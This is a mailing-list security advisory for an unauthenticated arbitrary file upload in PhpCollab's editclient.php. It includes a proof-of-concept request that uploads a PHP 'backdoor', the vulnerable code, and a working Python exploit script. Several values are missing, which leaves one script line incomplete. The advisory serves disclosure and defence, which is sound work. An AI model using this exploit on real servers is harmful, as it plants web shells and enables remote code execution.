  oss-security - PhpCollab Arbitrary File Upload  (unauthenticated)            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Fri, 29 Sep From: Sysdream Labs <labs@...dream.com> To: fulldisclosure@...lists.org Cc: oss-security@...ts.openwall.com Subject: PhpCollab Arbitrary File Upload  (unauthenticated)  # PhpCollab Arbitrary File Upload (unauthenticated)  ## Description  PhpCollab is an open source web-based project management system, that enables collaboration across the Internet.  ## Arbitrary File Upload  The phpCollab code does not correctly filter uploaded file contents. An unauthenticated attacker may upload and execute arbitrary code.  **CVE ID**:  **Access Vector**: remote  **Security Risk**: Critical  **Vulnerability**:  **CVSS Base Score**: 10 (Critical)  **CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H  ### Proof of Concept  The following HTTP request allows an attacker to upload a malicious php file, without authentication. Thus, a file named after `$id.extension` is created.  For example, a backdoor file can be reached at `http://phpCollab.lan/logos_clients/1.php`.  ``` POST /clients/editclient.php?id=1&action=update HTTP/1.1 Host: phpCollab.lan Accept: Accept-Language: Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: multipart/form-data; Content-Length:  Content-Disposition: form-data; name="upload"; filename="backdoor.php" Content-Type: application/x-php  <?php phpinfo(); ?>  ```   ### Vulnerable code  The vulnerable code is found in `clients/editclient.php`, line 63.  ``` $extension = strtolower( substr( strrchr($_FILES['upload']['name'], ".") ,1) ); if(@move_uploaded_file($_FILES['upload']['tmp_name'], "../logos_clients/".$id.".$extension")) {     $tmpquery = "UPDATE ".$tableCollab["organizations"]." SET extension_logo='$extension' WHERE id='$id'";   connectSql("$tmpquery"); } ```   ### Exploit code  ``` #!/usr/bin/env python # -*- coding: utf-8 -*-  import os import sys import requests  if __name__ == '__main__':     if (len(sys.argv) != 4):         print("Enter your target, userid and path for file upload like : python exploit.py http://www.phpCollabURL.lan 1 /tmp/test.php")         sys.exit(1)      target = "%s/clients/editclient.php?id=%s&action=update" % (sys.argv[1], sys.argv[2])     print("[*] Trying to exploit with URL : %s..." % target)     backdoor = {'upload': open(sys.argv[3], 'rb')}     r = requests.post(target, files=backdoor)     extension = os.path.splitext(sys.argv[3])[1]     link = "%s/logos_clients/%s%s" % (sys.argv[1], sys.argv[2], extension )     r = requests.get(link)     if r.status_code ==         print("[OK] Backdoor link : %s" % link)     else:         print("[FAIL]Problem (status:%s) (link:%s)" % (r.status_code, link)) ```  ## Solution  Update to the latest version avalaible.  ## Affected versions  * Version <=  ## Timeline (dd/mm/yyyy)  * : Initial discovery. * : Initial contact. * : GPG Key exchange. * : Advisory sent to vendor. * : First fixes. * : Fixes validation by Sysdream. * : PhpCollab ask to wait before publish. * : New version has been released. * : Public disclosure.  ## Credits  * Nicolas SERRA, Sysdream  (n.serra -at- sysdream -dot- com)  --  SYSDREAM Labs <labs@...dream.com>  GPG : C43E 2A2E 8EB4 8CD9 D5B2  * Website: https://sysdream.com/ * Twitter: @sysdream    Download attachment "signature.asc" of type "application/pgp-signature" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      